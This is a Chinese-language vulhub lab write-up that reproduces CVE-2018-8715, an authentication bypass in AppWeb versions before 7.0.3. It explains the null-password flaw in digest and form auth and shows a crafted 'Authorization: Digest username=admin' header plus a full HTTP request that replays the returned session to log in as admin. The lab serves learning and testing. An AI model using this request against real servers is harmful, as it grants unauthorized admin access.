## 一、准备工作

复现此漏洞需要安装docker，下载安装docker-compose，搭建vulhub靶场，保证攻击机与靶机之间的网络互通。

## 二、漏洞介绍

AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web
Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。

  

AppWeb可以进行认证配置，其认证方式包括以下三种：

  

basic 传统HTTP基础认证

digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头

form 表单认证

其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。

  

参考链接：

  

<https://ssd-disclosure.com/index.php/archives/3676>

  

## 三、复现过程

首先启动靶机漏洞环境：

我们cd到vulhub目录下的该漏洞目录

cd vulhub/appweb/CVE-2018-8715/

在此目录下执行命令docker-compose up -d

启动漏洞环境

![1652172430_627a268e3f8eefcdef0ec.png!small?1652172431038](https://image.3001.net/images/20220510/1652172430_627a268e3f8eefcdef0ec.png!small?1652172431038)

访问<http://your-ip:8080>可以发现要求登录

![1652172442_627a269af3fcd4296816a.png!small?1652172443651](https://image.3001.net/images/20220510/1652172442_627a269af3fcd4296816a.png!small?1652172443651)

利用此漏洞需要已存在的用户名，当前环境下用户名为admin

用户名输入admin然后burp抓包放到repeater

构造http头部，添加Authorization: Digest
username=admin至Host下然后send，服务器就会返还带session得数据包，利用这个session即可实现绕过验证。

![1652172463_627a26afb2ce51f09a528.png!small?1652172464465](https://image.3001.net/images/20220510/1652172463_627a26afb2ce51f09a528.png!small?1652172464465)

此时我们再构造一个请求包，带上session和username参数提交

  

GET / HTTP/1.1

Host: 192.168.192.130:8080

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101
Firefox/99.0

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Authorization: Digest username="admin"

-http-session-=2::http.session::e4ad3cd44d9712eefdbbe3e5cd282a59;

Content-Length: 14

  

username=admin

![1652172490_627a26ca754d861496ffb.png!small?1652172491155](https://image.3001.net/images/20220510/1652172490_627a26ca754d861496ffb.png!small?1652172491155)

就登陆成功了。

![1652172499_627a26d36ae140be9c276.png!small?1652172500155](https://image.3001.net/images/20220510/1652172499_627a26d36ae140be9c276.png!small?1652172500155)

做完实验关闭docker：

docker-compose down

![1652172514_627a26e250af2e05894a1.png!small?1652172515062](https://image.3001.net/images/20220510/1652172514_627a26e250af2e05894a1.png!small?1652172515062)

  

